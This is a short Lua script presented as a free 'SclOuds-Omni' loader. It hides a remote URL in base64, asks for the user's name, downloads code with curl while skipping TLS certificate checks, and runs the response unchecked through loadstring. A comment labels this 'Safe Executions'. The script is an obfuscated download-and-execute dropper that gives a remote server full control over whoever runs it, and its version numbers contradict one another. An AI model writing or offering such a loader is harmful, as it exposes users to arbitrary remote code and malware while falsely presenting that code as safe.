-- =============================================================
-- 🚀 SCLOUDS-OMNI v10 - FREE LOADER
-- =============================================================

local function decode(str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        return string.char(tonumber(x, 2))
    end))
end


-- "aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==" 
local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")

os.execute("clear")
print("\27[1;36mScloudsOmni v12 - Connecting...\27[0m")

io.write("\27[33m[?] Masukkan Nama Anda: \27[0m")
local user = io.read()

-- Safe Executions
local pipe = io.popen("curl -sL -k -A '" .. ident .. "' '" .. target .. "'")
if pipe then
    local content = pipe:read("*a")
    pipe:close()
    if content and content ~= "" then
        local run = loadstring(content) or load(content)
        if run then
            _G.UserName = user 
            run()
        end
    end
end
